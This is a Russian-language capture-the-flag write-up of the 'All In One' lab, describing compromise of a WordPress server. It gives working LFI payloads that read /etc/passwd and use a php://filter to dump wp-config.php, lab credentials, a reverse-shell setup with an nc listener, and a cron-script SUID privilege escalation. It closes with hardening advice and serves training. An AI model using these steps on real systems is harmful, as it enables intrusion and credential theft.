# Отчет по прохождению All In One

## 1. Разведка (Reconnaissance)

### Сканирование портов

Выполнено сканирование целевой системы с использованием Nmap.

**Результаты:**

- 21/tcp — FTP (vsftpd 3.0.5)
- 22/tcp — SSH (OpenSSH 8.2p1 Ubuntu)
- 80/tcp — HTTP (Apache 2.4.41)

### FTP-доступ

Подключение к FTP-серверу с анонимным доступом (anonymous) не выявило файлов в корневой директории.

### Веб-сервер

На порту 80 обнаружена стандартная страница Apache.

## 2. Перечисление директорий

С помощью инструмента `gobuster` проведён фаззинг директорий:

```bash
gobuster dir -u "http://10.48.185.181" -w /usr/share/wordlists/dirb/big.txt -r
```

**Найденные директории:**

- `/wordpress` (Status: 301)
- `/hackathons` (Status: 200)

---

## 3. Анализ WordPress

### Инструмент WPScan

Использован `wpscan` для анализа установки WordPress.

**Результаты:**

- **Версия WordPress:** 5.5.1
- **Активная тема:** twentytwenty (ver 1.5 — устаревшая)
- **Uploads директория:** включён листинг `http://10.48.185.181/wordpress/wp-content/uploads/`

**Идентифицированные плагины:**

- `mail-masta` (ver 1.0)
- `reflex-gallery`

**Идентифицированные пользователи:**

- `elyana`

### Брутфорс паролей

Попытка брутфорса пароля для пользователя `elyana` через WPScan не дала результатов.

## 4. Поиск уязвимостей

На основе данных WPScan найдены следующие уязвимости:

- **WordPress Plugin Mail Masta 1.0** — Local File Inclusion (LFI)
- **Mail Masta 1.0** — Multiple SQL Injection
- **Reflex Gallery <= 3.1.3** — Arbitrary File Upload

## 5. Эксплуатация LFI

### Проверка LFI

Уязвимость LFI подтверждена через скрипт `count_of_send.php`:

```bash
http://10.48.185.181/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```

Файл `/etc/passwd` успешно прочитан. Получены следующие пользователи с оболочкой:

- `root`
- `elyana`
- `ubuntu`

### Перечисление файлов через LFI

Через LFI прочитаны следующие файлы:

- `/etc/apache2/apache2.conf`
- `/etc/init.d/apache2`
- `/etc/vsftpd.conf`
- `/var/log/lastlog`
- `/var/log/dmesg`
- `/var/log/wtmp`

### Анализ `/etc/vsftpd.conf`

В конфигурационном файле обнаружены настройки:

```bash
write_enable=YES
anonymous_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
```

Однако загрузить файл через FTP не удалось (отсутствуют права на запись).

---

## 6. Обнаружение cron-задачи

В файле `/etc/crontab` найдена задача, выполняющаяся от root каждую минуту:

```bash
* * * * * root /var/backups/script.sh
```

Содержимое скрипта `/var/backups/script.sh`:

```bash
#!/bin/bash
#Just a test script, might use it later to for a cron task
```

Скрипт представляет собой заглушку и будет использован для эскалации привилегий.

## 7. SQL-инъекция (проверка)

Попытка эксплуатации SQL-инъекции через параметр `list_id` с использованием `SLEEP(5)` не дала результатов (отсутствие задержки).

## 8. Чтение wp-config.php через PHP-фильтр

Поскольку LFI не позволяет читать PHP-файлы напрямую (они выполняются), использован PHP-фильтр для получения исходного кода в base64:

```bash
http://10.48.185.181/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=/var/www/html/wordpress/wp-config.php
```

После декодирования base64 получены учётные данные базы данных:

```php
define( 'DB_USER', 'elyana' );
define( 'DB_PASSWORD', 'H@ckme@123' );
```

### Проверка учётных данных

- SSH: не подошли
- WordPress admin: **успешно**

---

## 9. Получение reverse shell через WordPress

### Авторизация в админ-панели

Используя логин `elyana` и пароль `H@ckme@123`, выполнен вход в `/wp-admin`.

### Загрузка reverse shell

В разделе **Appearance → Theme Editor** выбран файл темы (404.php). В него вставлен код reverse shell от PentestMonkey с указанием IP и порта атакующей машины.

### Запуск слушателя

На атакующей машине запущен слушатель:

```bash
nc -lvnp 4444
```

### Активация шелла

При обращении к `http://ip/wordpress/wp-content/themes/twentytwenty/404.php` получено соединение.

**Результат:**

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## 10. Подготовка к эскалации привилегий

### Находка в директории пользователя elyana

В домашней директории пользователя `elyana` найден файл `hint.txt`:

```bash
Elyana's user password is hidden in the system. Find it ;)
```

### Анализ директории `/hackathons`

При исследовании директории `/hackathons` в исходном коде страницы обнаружены комментарии:

```html
<!-- Dvc W@iyur@123 -->
<!-- KeepGoing -->
```

Строка `Dvc W@iyur@123` впоследствии не пригодилась.

### Использование cron-задачи

Скрипт `/var/backups/script.sh` имеет права `-rwxrwxrwx` (доступен для записи всем). В него записано:

```bash
echo '#!/bin/bash
chmod u+s /bin/bash' > /var/backups/script.sh
```

Скрипт выполняется каждую минуту от root.

---

## 11. Эскалация привилегий до root

### SUID на /bin/bash

После выполнения cron-задачи на `/bin/bash` установлен SUID-бит.

### Получение root-привилегий

```bash
bash -p
```

**Результат:**

```bash
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

Эффективный UID (euid) стал 0 (root).

### Чтение флагов

- Пользовательский флаг (`user.txt`) — извлечён
- Root-флаг (`root.txt`) — извлечён

---

## 12. Выводы и достижения

### Векторы атаки

1. **LFI через плагин Mail Masta** — чтение конфигурационных файлов
2. **PHP-фильтр** — обход выполнения PHP-файлов для чтения исходного кода
3. **Учётные данные из wp-config.php** — доступ в админку WordPress
4. **Reverse shell через редактор темы** — получение доступа от www-data
5. **Cron-задача с правами на запись** — установка SUID на `/bin/bash`
6. **SUID-бит на bash** — эскалация до root через `bash -p`

### Достижения

- Впервые использован PHP-фильтр для чтения исходного кода `.php` файлов при LFI
- Впервые применена комбинация: LFI → wp-config.php → админка WordPress → reverse shell → cron-задача → SUID → root

### Рекомендации

1. Обновить WordPress до актуальной версии
2. Удалить уязвимые плагины (mail-masta, reflex-gallery)
3. Отключить листинг директории `/wp-content/uploads/`
4. Запретить анонимную запись в cron-скрипты
5. Не хранить пароли в конфигурационных файлах в открытом виде
6. Использовать SFTP вместо FTP
